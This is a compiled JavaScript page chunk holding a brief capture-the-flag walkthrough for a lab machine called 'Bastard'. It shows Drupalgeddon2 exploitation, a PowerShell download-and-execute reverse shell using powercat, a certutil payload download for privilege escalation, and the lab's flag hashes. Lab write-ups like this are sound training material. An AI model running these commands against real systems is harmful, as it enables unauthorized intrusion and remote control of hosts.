(window.webpackJsonp=window.webpackJsonp||[]).push([[68],{409:function(a,s,e){"use strict";e.r(s);var t=e(13),r=Object(t.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"bastard"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bastard"}},[a._v("#")]),a._v(" Bastard")]),a._v(" "),s("h2",{attrs:{id:"recon"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#recon"}},[a._v("#")]),a._v(" Recon")]),a._v(" "),s("p",[a._v("Starting with recon:")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("sudo")]),a._v(" autorecon "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("10.10")]),a._v(".10.9\n")])])]),s("h2",{attrs:{id:"enumeration"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#enumeration"}},[a._v("#")]),a._v(" Enumeration")]),a._v(" "),s("ul",[s("li",[s("code",[a._v("Drupal 7.54")]),a._v(" on port 80")])]),a._v(" "),s("h2",{attrs:{id:"exploit"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#exploit"}},[a._v("#")]),a._v(" Exploit")]),a._v(" "),s("p",[a._v("Drupalgeddon2 the ruby script works from "),s("code",[a._v("searchsploit")])]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("searchsploit "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-m")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("44449")]),a._v(".rb\n")])])]),s("p",[a._v("and when running this, we get a warning about a shebang error, so we use dos2unix to fix this.")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("dos2unix "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("44449")]),a._v(".rb\n")])])]),s("p",[a._v("and finally fire off the exploit:")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("ruby "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("44449")]),a._v(".rb\n")])])]),s("p",[a._v("now running this with reverse shell on "),s("code",[a._v("443")]),a._v(":")]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("powershell "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("\"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.27/powercat.ps1');powercat -c 10.10.14.27 -p 443 -e cmd\"")]),a._v("\n")])])]),s("p",[a._v("gives us a low priv reverse shell.")]),a._v(" "),s("p",[a._v("User.txt: "),s("code",[a._v("ba22fde1932d06eb76a163d312f921a2")])]),a._v(" "),s("h2",{attrs:{id:"privilege-escalation"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#privilege-escalation"}},[a._v("#")]),a._v(" Privilege escalation")]),a._v(" "),s("p",[a._v("Get systeminfo and use "),s("code",[a._v("windows-exploit-suggester")])]),a._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[a._v("certutil.exe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-urlcache")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-split")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://10.10.14.27/MS10-059.exe"')]),a._v(" C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("inetpub"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("drupal-7.54"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("MS10-059.exe\n\nMS10-059.exe "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("10.10")]),a._v(".14.27 "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("5555")]),a._v("\n")])])]),s("p",[a._v("root.txt: "),s("code",[a._v("4bf12b963da1b30cc93496f617f7ba7c")])])])}),[],!1,null,null,null);s.default=r.exports}}]);